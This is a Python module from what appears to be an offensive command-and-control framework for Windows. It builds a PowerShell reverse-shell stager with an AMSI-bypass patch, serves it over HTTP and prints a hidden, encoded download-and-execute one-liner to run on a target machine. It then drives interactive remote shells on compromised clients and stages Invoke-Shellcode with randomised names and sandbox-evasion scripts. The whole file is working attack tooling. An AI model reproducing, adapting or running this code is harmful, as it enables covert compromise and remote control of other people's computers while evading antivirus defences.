import prompt_toolkit
import blessed
import time
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.patch_stdout import patch_stdout
from base64 import b64encode
from .listener import StartAsync
from .main import amsiPatch, payloaddir, randomUnusedPort, DoServe, \
                 powershellShellcodeLayout, randomisePS1


history = prompt_toolkit.history.InMemoryHistory()

t = blessed.Terminal()

serverlist = []


def killAllClients():
    from .menu import clientMenuOptions
    if len(clientMenuOptions) > 2:
        suretoquit = input('You have clients connected. Are you sure you want to exit? [y]/n: ')
        if suretoquit.lower() == 'y' or suretoquit.lower() == '':
            for server in serverlist:
                server.server.close()
            return True
        else:
            return False
    else:
        return True


def printListener(printit=True, returnit=False):
    from .menu import returnIP
    powershellFileName = 'p.ps1'

    while True:
        with patch_stdout():
            bindOrReverse = prompt_toolkit.prompt('[?] (b)ind/(r)everse: ', completer=WordCompleter(['b', 'r'])).lower()
        if bindOrReverse == 'b':
            print('Bind is currently not working in python3')
        elif bindOrReverse == 'r':
            break
    powershellContent = open('lib/powershell/stager.ps1', 'r').read()
    if bindOrReverse == 'r':
        windows_powershell_stager = powershellContent % ('False', returnIP(), '5555')
    with open((payloaddir() + '/' + powershellFileName), 'w') as powershellStagerFile:
        stager_content = amsiPatch + windows_powershell_stager
        powershellStagerFile.write(stager_content)
        powershellStagerFile.close()

    randoStagerDLPort = randomUnusedPort()

    DoServe(returnIP(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
    stagerexec = 'powershell -w hidden -noni -enc ' + b64encode(("IEX (New-Object Net.Webclient).DownloadString('http://" + returnIP() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le')).decode()
    if printit:
        print(t.bold_green + '[!] Run this on target machine...' + t.normal + '\n\n' + stagerexec + '\n')

    if bindOrReverse == 'r':
        if not serverlist:
            listener = StartAsync()
            listener.start()
            serverlist.append(listener)

    if returnit:
        return stagerexec
    else:
        return "pass"


def interactShell(clientnumber):
    clientnumber = int(clientnumber)
    from .menu import clientMenuOptions
    for server in serverlist:
        if clientnumber in list(server.server.clients.keys()):
            print("Commands\n" + "-"*50 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*50)
            while True:
                try:
                    if server.server.clients[clientnumber].in_buffer:
                        print(server.server.clients[clientnumber].in_buffer.pop())
                    command = prompt_toolkit.prompt("PS >", completer=WordCompleter(['back', 'exit']), style=prompt_toolkit.styles.Style.from_dict({'': '#FFCC66'}), history=history)
                    if command.lower() == "back":
                        break
                    if command.lower() == "exit":
                        server.server.clients[clientnumber].close_client()
                        del clientMenuOptions[str(clientnumber)]
                        time.sleep(2)
                        break
                    if command == "":
                        server.server.clients[clientnumber].writer.write('{"type":"", "data":"", "sendoutput":""}'.encode())
                    else:
                        json = '{"type":"exec", "data":"%s", "sendoutput":"true"}' % (b64encode(command.encode('UTF_16_le'))).decode()
                        server.server.clients[clientnumber].writer.write(json.encode())
                        while not server.server.clients[clientnumber].in_buffer:
                            time.sleep(0.01)
                        print(server.server.clients[clientnumber].in_buffer.pop())
                except KeyboardInterrupt:
                    break

    return "clear"


def returnServerList():
    return serverlist


def checkPayloadLength(payload):
    maxlen = 10000
    splitPayload = []
    payloadLen = len(payload)

    if payloadLen > maxlen:
        current_length = 0
        numberOfPackets = int(payloadLen / maxlen)
        if payloadLen % maxlen != 0:
            numberOfPackets += 1

        while current_length < payloadLen:
            cutlength = maxlen
            if payloadLen < current_length + maxlen:
                cutlength = payloadLen - current_length

            tmp_str = payload[current_length:current_length + cutlength]
            current_length += maxlen
            splitPayload.append(tmp_str)
    else:
        splitPayload = None

    return splitPayload


def checkUpload():
    from .menu import clientMenuOptions
    with patch_stdout():
        use_client_upload = prompt_toolkit.prompt('\n[?] Upload Using Client Connection? [y]/n: ', patch_stdout=True, completer=WordCompleter(['y', 'n']))
    print()
    if use_client_upload.lower() == 'y' or use_client_upload == '':
        clientList = []
        for i in list(clientMenuOptions.keys()):
            if i == 'back' or i == 'r':
                pass
            else:
                clientList.append(i)
                print(t.bold_yellow + i + t.normal + ': ' + t.bold_green + clientMenuOptions[i]['payload']  + t.bold_yellow + ' | ' + t.bold_green + list(clientMenuOptions[i]['availablemodules'].keys())[0] + t.bold_yellow + ' | ' + t.bold_green + list(clientMenuOptions[i]['availablemodules'].keys())[1] + t.normal)
        print()
        while True:
            with patch_stdout():
                clientchoice = prompt_toolkit.prompt('Client > ', patch_stdout=True, style=prompt_toolkit.styles.style_from_dict({prompt_toolkit.token.Token: '#FFCC66'}), completer=WordCompleter(clientList))
            try:
                return int(clientMenuOptions[clientchoice]['params'])
            except:
                continue
    return False


def clientUpload(powershellExec, isExe, json):
    from .menu import returnIP
    from .encrypt import getSandboxScripts
    clientnumber = checkUpload()
    if clientnumber:
        if isExe:
            newpayloadlayout = powershellShellcodeLayout(powershellExec)
            moduleport = randomUnusedPort()
            powershellChanges = randomisePS1('Invoke-Shellcode')
            filename = powershellChanges.get('filename')
            pForce = powershellChanges['params'].get('Force')
            pCode = powershellChanges['params'].get('Shellcode')
            DoServe(returnIP(), "", "./externalmodules/staged", port=moduleport, printIt=False)
            encPowershell = getSandboxScripts('powershell')
            encPowershell += "IEX(New-Object Net.WebClient).DownloadString('http://%s:%s/%s.ps1');Start-Sleep 30;%s -%s -%s @(%s)"%(returnIP(), moduleport, filename, filename, pForce, pCode, newpayloadlayout.rstrip(','))
            encPowershell = b64encode(encPowershell.encode('UTF-16LE'))
            fullExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if($Arch -eq 'x86'){powershell -exec bypass -enc \"%s\"}elseif($Arch -eq 'amd64'){$powershell86 = $env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
            b64Exec = b64encode(fullExec.encode('UTF-16LE'))
        else:
            b64Exec = b64encode(powershellExec.encode('UTF-16LE'))

        splitPayoad = checkPayloadLength(b64Exec)

        if splitPayoad:
            for p in splitPayoad:
                for server in serverlist:
                    if clientnumber in list(server.handlers.keys()):
                        server.handlers[clientnumber].out_buffer.append(json % (p))
                        time.sleep(0.5)
            time.sleep(0.5)
            for server in serverlist:
                if clientnumber in list(server.handlers.keys()):
                    server.handlers[clientnumber].out_buffer.append('{"type":"", "data":"", "sendoutput":"false", "multiple":"exec"}')
        else:
            for server in serverlist:
                if clientnumber in list(server.handlers.keys()):
                    server.handlers[clientnumber].out_buffer.append(json % (b64Exec))

        return clientnumber

    else:
        return False
